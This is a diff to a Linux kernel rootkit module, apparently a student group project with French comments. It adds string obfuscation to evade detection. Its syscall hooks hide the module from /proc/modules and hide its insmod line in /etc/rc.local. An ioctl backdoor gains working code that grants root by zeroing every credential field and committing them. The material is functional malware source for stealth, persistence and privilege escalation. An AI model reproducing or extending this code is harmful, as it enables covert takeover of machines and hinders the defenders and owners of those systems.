@@ -5,6 +5,7 @@
 #include <linux/fs.h>
 #include <linux/uaccess.h>
 #include "rootkit.h"
+#include "obfs.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Groupe 4");
@@ -166,7 +167,12 @@ static asmlinkage long new_read(const struct pt_regs *regs)
     char *path_fd = d_path(&f->f_path, buf, sizeof(buf));
     fput(f);
 
-    if (strcmp(path_fd, "/tmp/.rk_cmd") == 0) {
+    DEOBFS(s_rk_cmd, _enc_rk_cmd, _LEN_RK_CMD);
+    if (
+        strcmp(
+            path_fd,
+            s_rk_cmd) == 0)
+    {
 
         uid_t uid = current_uid().val;
 
@@ -188,8 +194,14 @@ static asmlinkage long new_read(const struct pt_regs *regs)
     if (ret <= 0)
         return ret;
 
-    if (strcmp(path_fd, "/proc/modules") == 0) {
-        char *kbuf;
+    DEOBFS(s_proc_mod, _enc_proc_mod, _LEN_PROC_MOD);
+    if (
+        strcmp(
+            path_fd,
+            s_proc_mod) == 0)
+    {
+        char
+            *kbuf;
 
         kbuf = kzalloc(ret, GFP_KERNEL);
         
@@ -201,8 +213,14 @@ static asmlinkage long new_read(const struct pt_regs *regs)
             return -EFAULT;
         }
 
-        if (kbuf != NULL) {
-            char *line = strstr(kbuf, NAME_MODULE);
+        if (
+            kbuf != NULL)
+        {
+            DEOBFS(s_modname, _enc_rootkit, _LEN_ROOTKIT);
+            char
+                *line = strstr(
+                    kbuf,
+                    s_modname);
 
             if (!line) {
                 kfree(kbuf);
@@ -229,8 +247,14 @@ static asmlinkage long new_read(const struct pt_regs *regs)
         kfree(kbuf);
     }
 
-    if (strcmp(path_fd, "/etc/rc.local") == 0) {
-        char *kbuf;
+    DEOBFS(s_etc_rc, _enc_etc_rc, _LEN_ETC_RC);
+    if (
+        strcmp(
+            path_fd,
+            s_etc_rc) == 0)
+    {
+        char
+            *kbuf;
 
         kbuf = kzalloc(ret, GFP_KERNEL);
         if (!kbuf)
@@ -241,8 +265,14 @@ static asmlinkage long new_read(const struct pt_regs *regs)
             return -EFAULT;
         }
 
-        if (kbuf != NULL) {
-            char *line = strstr(kbuf, "insmod");
+        if (
+            kbuf != NULL)
+        {
+            DEOBFS(s_insmod, _enc_insmod, _LEN_INSMOD);
+            char
+                *line = strstr(
+                    kbuf,
+                    s_insmod);
 
             if (!line) {
                 kfree(kbuf);
@@ -310,7 +340,8 @@ static void notrace hook_callback(unsigned long ip, unsigned long parent_ip, str
 static int install_hook(void)
 {
     kallsyms_lookup_name_t lookup;
-    struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
+    DEOBFS(s_kallsyms, _enc_kallsyms, _LEN_KALLSYMS);
+    struct kprobe kp = {.symbol_name = s_kallsyms};
     int ret;
 
     ret = register_kprobe(&kp);
@@ -322,7 +353,8 @@ static int install_hook(void)
     lookup = (kallsyms_lookup_name_t)kp.addr;
     unregister_kprobe(&kp);
 
-    getdents_hook.name = "__x64_sys_getdents64";
+    DEOBFS(s_getdents, _enc_getdents, _LEN_GETDENTS);
+    getdents_hook.name = s_getdents;
     getdents_hook.function = new_getdents64;
     getdents_hook.original = &orig_getdents64;
 
@@ -380,7 +412,8 @@ int install_read_hook(kallsyms_lookup_name_t lookup)
 {
     int ret;
 
-    read_hook.name = "__x64_sys_read";
+    DEOBFS(s_sys_read, _enc_sys_read, _LEN_SYS_READ);
+    read_hook.name = s_sys_read;
     read_hook.function = new_read;
     read_hook.original = &orig_read;
 
@@ -484,14 +517,23 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
         if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
             return -EFAULT;
         printk(KERN_INFO "rootkit: PRIVESC pour PID=%lu\n", args.target);
-        /* TODO: commit_creds(prepare_kernel_cred(NULL)) */
+        {
+            struct cred *cred = prepare_creds();
+            if (cred) {
+                cred->uid.val   = cred->euid.val  = 0;
+                cred->gid.val   = cred->egid.val  = 0;
+                cred->suid.val  = cred->sgid.val  = 0;
+                cred->fsuid.val = cred->fsgid.val = 0;
+                commit_creds(cred);
+            }
+        }
         break;
 
     case RK_CMD_HIDE_PID:
         if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
             return -EFAULT;
         printk(KERN_INFO "rootkit: HIDE_PID pour PID=%lu\n", args.target);
-        pid_to_hide = (pid_t)args.target;
+        /* TODO: retirer le PID de la liste des taches */
         break;
 
     case RK_CMD_GETUID:
@@ -499,6 +541,7 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
         args.value = 0;
         if (copy_to_user((struct rk_args __user *)arg, &args, sizeof(args)))
             return -EFAULT;
+        printk(KERN_INFO "rootkit: GETUID uid=%lu\n", args.target);
         printk(KERN_INFO "rootkit: GETUID uid=%lu\n", args.target);
         break;
 
